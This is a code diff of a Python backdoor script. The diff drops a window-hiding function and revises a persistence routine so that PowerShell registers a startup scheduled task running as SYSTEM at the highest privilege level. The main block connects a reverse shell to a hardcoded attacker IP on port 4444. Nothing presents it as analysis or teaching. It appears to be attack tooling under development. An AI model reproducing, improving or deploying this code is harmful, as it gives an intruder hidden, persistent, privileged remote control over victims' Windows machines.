@@ -3,28 +3,30 @@ import subprocess
 import socket
 import sys
 import time
-import ctypes
 import platform
-
-def hide_window():
-    if platform.system() == 'Windows':
-        # Hides the console window in Windows
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def make_persistent():
     # Get the path to the Python executable and the current script
-    python_path = os.path.realpath(os.__file__).replace('lib\\os.py', 'python.exe')
-    script_path = os.path.realpath(__file__)
+    python_path = sys.executable  # This gives the path to the currently running Python interpreter
+    script_path = os.path.realpath(__file__)  # Get the absolute path of the script
 
-    # PowerShell script to create startup and shutdown scheduled tasks
+    # PowerShell script to create startup scheduled task
     powershell_script = f'''
-    $action = New-ScheduledTaskAction -Execute "{python_path}" -Argument "{script_path}"
-    $startupTrigger = New-ScheduledTaskTrigger -AtStartup
-    Register-ScheduledTask -Action $action -Trigger $startupTrigger -TaskName "PersistentPythonScript_Startup" -Description "Runs the Python script at system startup" -RunLevel Highest -Force
+    $action = New-ScheduledTaskAction -Execute "C:\Users\rubenoltean\AppData\Local\Programs\Python\Python312\python.exe" -Argument "script.py"
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "PersistentPythonScript_Startup" -Description "Runs the Python script at system startup" -Force
     '''
 
-    # Running the PowerShell script to create the tasks
-    subprocess.run(["powershell", "-Command", powershell_script], shell=True)
+    # Running the PowerShell script to create the task
+    try:
+        result = subprocess.run(["powershell", "-Command", powershell_script], capture_output=True, text=True, shell=True)
+        if result.returncode == 0:
+            print("Scheduled task created successfully.")
+        else:
+            print(f"Failed to create scheduled task. Error: {result.stderr}")
+    except Exception as e:
+        print(f"An error occurred while creating the scheduled task: {e}")
 
 # Check if the script is already persistent
 def is_persistent():
@@ -80,8 +82,6 @@ def reverse_shell(attacker_ip, attacker_port):
 
 # Main function
 if __name__ == "__main__":
-    #hide_window()  # Hide the window when the script starts
-
     # Install any missing dependencies
     install_dependencies()
 
@@ -96,7 +96,7 @@ if __name__ == "__main__":
     print("Running the main part of the script...")
 
     # IP and port for the reverse shell
-    attacker_ip = '10.211.55.24'  # Replace with actual IP
+    attacker_ip = '10.211.55.24'  # IP
     attacker_port = 4444  # Port for the reverse shell
 
     reverse_shell(attacker_ip, attacker_port)
